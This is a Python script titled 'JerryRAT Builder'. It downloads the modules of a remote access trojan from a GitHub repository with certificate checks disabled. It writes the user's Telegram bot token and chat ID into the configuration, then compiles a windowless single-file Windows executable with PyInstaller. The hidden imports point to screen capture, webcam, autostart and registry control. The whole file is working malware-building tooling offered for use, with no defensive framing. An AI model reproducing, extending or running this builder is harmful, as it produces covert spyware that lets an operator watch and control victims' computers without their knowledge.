import os, ssl
import urllib.request

GITHUB_REPO   = "OhmnicDev/JerryRAT"
GITHUB_BRANCH = "main"
 
FILES = [
    "TGserver.py",
    "config.py",
    "utils/AutoStart.py",
    "utils/System.py",
    "utils/UtilsCD.py",
    "utils/UtilsFUN.py",
    "utils/UtilsGUI.py",
]
 
pyinstaller_cmd = 'python -m PyInstaller TGserver.py --onefile --noconsole --name TGserver --add-data "utils;utils" --add-data "config.py;." --hidden-import telebot --hidden-import requests --hidden-import pyautogui --hidden-import cv2 --hidden-import moviepy --hidden-import moviepy.editor --hidden-import numpy --hidden-import av --hidden-import wave --hidden-import wmi --hidden-import psutil --hidden-import re --hidden-import winreg --hidden-import comtypes --hidden-import comtypes.client --hidden-import pycaw --hidden-import pycaw.pycaw --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import pygetwindow --hidden-import ctypes --hidden-import pathlib --hidden-import socket --hidden-import webbrowser --hidden-import subprocess --hidden-import threading --hidden-import collections --hidden-import collections.defaultdict --hidden-import imageio --hidden-import imageio.plugins --hidden-import imageio.plugins.ffmpeg --collect-all telebot --collect-all moviepy --collect-all cv2 --collect-all pycaw --collect-all comtypes --collect-all pyautogui --collect-all av --collect-all imageio'
 
def raw_url(path):
    return f"https://raw.githubusercontent.com/{GITHUB_REPO}/{GITHUB_BRANCH}/{path}"
 
def download_files():
    ctx = ssl._create_unverified_context()
    for f in FILES:
        os.makedirs(os.path.dirname(f) or ".", exist_ok=True)
        with urllib.request.urlopen(raw_url(f), context=ctx) as r:
            with open(f, "wb") as out:
                out.write(r.read())
 
def patch_config(token, chat_id):
    with open("config.py", "w", encoding="utf-8") as f:
        f.write(f'BOToken = "{token}"\n')
        f.write(f'Chat_ID = "{chat_id}"\n')
 
def build():
    print("Building...")
    os.system(pyinstaller_cmd)
 
def main():
    print("=== JerryRAT Builder ===\n")
    token   = input("Telegram bot token: ").strip()
    chat_id = input("Your telegram chat id: ").strip()
    download_files()
    patch_config(token, chat_id)
    build()
 
    print("\nSuccess, the file is in the folder dist/")
 
if __name__ == "__main__":
    main()
